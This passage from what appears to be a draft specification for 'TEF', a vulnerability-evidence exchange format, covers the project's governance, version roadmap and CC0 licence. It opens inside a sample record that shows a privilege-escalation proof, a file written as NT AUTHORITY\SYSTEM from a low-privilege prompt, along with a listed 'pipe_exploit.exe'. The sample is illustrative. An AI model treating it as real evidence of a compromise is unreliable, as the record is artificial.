        Written by NT AUTHORITY\SYSTEM at 2026-04-08T14:45:22Z

        C:\Users\lowpriv> icacls C:\Windows\Temp\proof.txt
        C:\Windows\Temp\proof.txt NT AUTHORITY\SYSTEM:(F)
      files:
        - name: pipe_exploit.exe
          hash: "sha256:7d4e1f3..."
          type: binary
```

## Governance

TEF is developed in the open. This draft is maintained
at its source repository and welcomes contributions,
corrections, and adoption feedback from vulnerability
coordination organisations, CERTs, CNAs, bug bounty
platforms, and security tool vendors.

The specification will advance through:

- **0.x** — Working drafts. Breaking changes expected.
  Implementations should pin to a specific version.
- **1.0** — Stable release. Schema frozen. Extensions
  only via namespaced blocks. Backward-compatible
  changes only.
- **Post-1.0** — New versions for structural changes.
  Previous versions remain valid indefinitely.

Progression to 1.0 requires at least two independent
implementations and documented use in production
vulnerability coordination workflows.

## Licence

TEF is an open format published under CC0 1.0
(public domain dedication). No restriction on use,
implementation, extension, or commercial adoption.
Attribution is appreciated but not required.
